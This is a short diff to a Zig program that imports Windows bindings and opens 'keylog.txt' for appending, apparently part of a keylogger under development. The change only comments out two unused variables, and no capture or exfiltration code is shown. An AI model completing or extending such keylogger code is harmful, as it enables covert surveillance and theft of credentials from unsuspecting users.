@@ -2,8 +2,8 @@ const std = @import("std");
 const windows = @import("std").os.windows;
 
 pub fn main() !void {
-    const stdout = std.io.getStdOut().writer();
-    const allocator = std.heap.page_allocator;
+    //const stdout = std.io.getStdOut().writer();
+    //const allocator = std.heap.page_allocator;
     const log_file_path = "keylog.txt";
 
     var file = try std.fs.cwd().createFile(log_file_path, .{ .truncate = false, .read = false, .append = true });
